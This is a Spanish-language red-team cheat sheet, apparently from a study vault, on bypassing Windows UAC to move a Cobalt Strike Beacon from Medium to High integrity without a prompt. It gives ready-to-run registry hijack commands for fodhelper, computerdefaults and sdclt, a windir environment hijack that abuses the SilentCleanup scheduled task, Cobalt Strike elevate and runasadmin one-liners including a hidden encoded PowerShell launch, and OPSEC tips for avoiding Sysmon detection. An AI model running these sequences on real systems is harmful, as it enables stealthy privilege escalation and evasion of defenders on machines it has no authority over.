---
tags: [privesc, windows, uac, bypass, red-team]
status: done
platform: windows
---

# UAC Bypasses

> Elevar de integridad *Medium* a *High* sin lanzar el prompt de UAC, abusando de binarios auto-elevables, tareas programadas y COM.

> Teoría de MIC/UAC y comandos de Cobalt Strike (`elevate` / `runasadmin`) en [[03-post-explotacion/privilege-escalation/windows/uac-bypass|UAC Bypass]].

---

## Concepto

Un Beacon sobre un usuario del grupo *Administradores locales* corre en integridad **Medium**. Para tocar el sistema necesitamos **High**, pero UAC exige consentimiento (click en "Sí") que no podemos pulsar sin delatarnos. Un **UAC bypass** fuerza esa elevación en silencio aprovechando dos piezas:

1. **Binario auto-elevable** — ejecutables firmados por Microsoft con `autoElevate=true` en su manifest, que Windows eleva a *High* **sin prompt**.
2. **Secuestro** de lo que ese binario ejecuta (registro, variable de entorno, COM o DLL) para colar nuestro comando dentro de ese proceso ya elevado.

Prerrequisito: usuario en Administradores locales. Casi todas requieren UAC por debajo de *Always Notify* (la técnica de SilentCleanup funciona incluso en *Always Notify*).

```
# ¿Estamos elevados?
beacon> getuid
# PowerShell: "Medium" = sin elevar, "High" = elevado
whoami /groups | findstr /i "Mandatory Label"
```

---

## 1. Registry hijack + fodhelper / computerdefaults

**Esencia:** `fodhelper.exe` y `computerdefaults.exe` son auto-elevables y, al arrancar, resuelven el handler del protocolo `ms-settings` en **HKCU** (no comprueban HKLM antes). Plantando ahí nuestro comando, se ejecuta en *High* sin prompt.

```
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /t REG_SZ /d "C:\Windows\Temp\beacon.exe" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /d "" /f
start fodhelper.exe        # alternativa equivalente: computerdefaults.exe
reg delete "HKCU\Software\Classes\ms-settings" /f   # limpieza OBLIGATORIA
```

---

## 2. sdclt.exe (IsolatedCommand)

**Esencia:** `sdclt.exe` (Backup/Restore) es auto-elevable y lanza comandos resolviéndolos vía el handler `exefile` en HKCU. Secuestrando `IsolatedCommand` se cuela el payload en *High*.

```
reg add "HKCU\Software\Classes\exefile\shell\runas\command" /v IsolatedCommand /t REG_SZ /d "C:\Windows\Temp\beacon.exe" /f
start sdclt.exe /kickoffelev
reg delete "HKCU\Software\Classes\exefile" /f
```

---

## 3. SilentCleanup (tarea programada + env hijack)

**Esencia:** la tarea `\Microsoft\Windows\DiskCleanup\SilentCleanup` tiene *Run with highest privileges* y es disparable por un usuario normal. Su acción usa `%windir%\system32\cleanmgr.exe`; como `windir` es una variable de entorno **de usuario** (modificable sin privilegios), se secuestra para ejecutar nuestro binario en *High*. **Funciona incluso con UAC en *Always Notify*.**

```
reg add "HKCU\Environment" /v windir /t REG_SZ /d "cmd /c start C:\Windows\Temp\beacon.exe ;" /f
schtasks /run /tn "\Microsoft\Windows\DiskCleanup\SilentCleanup" /I
reg delete "HKCU\Environment" /v windir /f
```

---

## 4. CMSTP (.INF)

**Esencia:** `cmstp.exe` instala perfiles de conexión desde un `.inf` y ejecuta comandos **auto-elevándose**; sirve también para evadir AppLocker (binario LOLBin firmado). Integrado en CS:

```
beacon> runasadmin uac-cmstp powershell -nop -w hidden -enc <base64>
```

---

## 5. Token Duplication

**Esencia:** no toca disco ni registro. Duplica el token elevado (*High*, pero filtrado por UAC) de un proceso del propio usuario y lo usa para arrancar un proceso en integridad alta. Más silenciosa, pero **parcheada en builds recientes de Windows 10/11** según versión.

```
beacon> elevate uac-token-duplication tcp-local
```

---

## 6. COM Elevation Moniker (interfaces auto-elevables)

**Esencia:** ciertos objetos COM declaran `Elevation\Enabled=1` y se instancian ya en *High* mediante el moniker `Elevation:Administrator!new:{CLSID}`. Interfaces como `ICMLuaUtil` (ejecutar comando), `IColorDataProxy` o `IFileOperation` (copiar DLL a rutas protegidas) permiten elevar sin prompt. Es la familia **más robusta y la base de la mayoría de métodos de UACME**.

---

## Cobalt Strike — resumen operativo

```
beacon> elevate uac-token-duplication  tcp-local     # token dup
beacon> elevate uac-schtasks           http          # tarea programada
beacon> runasadmin uac-cmstp           <comando>     # CMSTP .inf
beacon> elevate                                       # lista exploits cargados (ElevateKit)
```

---

## OPSEC

> ⚠️ fodhelper / computerdefaults / sdclt están muy firmados: la creación de claves `ms-settings` o `exefile\shell\runas\command` en HKCU seguida de un proceso hijo elevado es una detección clásica (Sysmon ID 13 + 1).
> - Borra **siempre** la clave de registro o variable de entorno que plantes.
> - SilentCleanup y COM (`ICMLuaUtil`) suelen dar mejor OPSEC que el registry hijack directo.
> - Evita payloads en disco: que el comando cargue el Beacon en memoria.

---

## Recursos

- **UACME (Hfiref0x)** — colección de referencia (~70 métodos, incl. COM): https://github.com/hfiref0x/UACME
- **ElevateKit (Cobalt Strike)** — exploits para el comando `elevate`: https://github.com/cobalt-strike/ElevateKit
- **HackTricks — UAC**: https://book.hacktricks.xyz/windows-hardening/authentication-credentials-uac-and-efs/uac-user-account-control
- **MITRE ATT&CK — T1548.002** (Bypass User Account Control)
- **CRTO** — módulo *Privilege Escalation* (elevate / token duplication / schtasks)
